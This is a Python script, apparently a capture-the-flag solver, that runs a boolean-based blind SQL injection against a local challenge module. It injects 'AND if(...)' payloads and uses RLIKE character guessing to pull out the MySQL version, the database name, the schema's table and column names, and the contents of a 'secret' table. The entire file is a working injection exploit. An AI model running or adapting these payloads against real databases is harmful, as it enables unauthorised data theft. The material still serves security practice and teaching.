from enum import Flag
from mysqli_invisible_bool import *
import string
import io
import sys

def escape_string(c):
    return "\\" + c if c in ".+*" else c

def exp():
    payload_template = "Liki4' AND if({exp},1,0);#"
    space = string.ascii_letters + string.digits + ' _:,$.'

    exp_template = "@@version RLIKE '^{c}'"
    exp_template = "DATABASE() RLIKE '^{c}'"
    exp_template = "(SELECT GROUP_CONCAT(table_name, ':', column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE '^{c}'"
    exp_template = "(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE '^{c}'"

    print(exp_template)

    Flag = True

    data = ""

    while Flag:
        ori_stdout = sys.stdout
        for c in space:
            payload = payload_template.format(exp=exp_template.format(c=data+c))
            sys.stdin = io.StringIO(payload + '\nLiki4')
            res = sys.stdout = io.StringIO()
            main()
            output = str(res.getvalue())
            if "failed" in output:
                continue
            if c == "$":
                Flag = False
                break
            if "success" in output:
                data += c
                break
        sys.stdout = ori_stdout
        if Flag:
            print(data, end="\r")
        else:
            print(data)

if __name__ == "__main__":
    exp()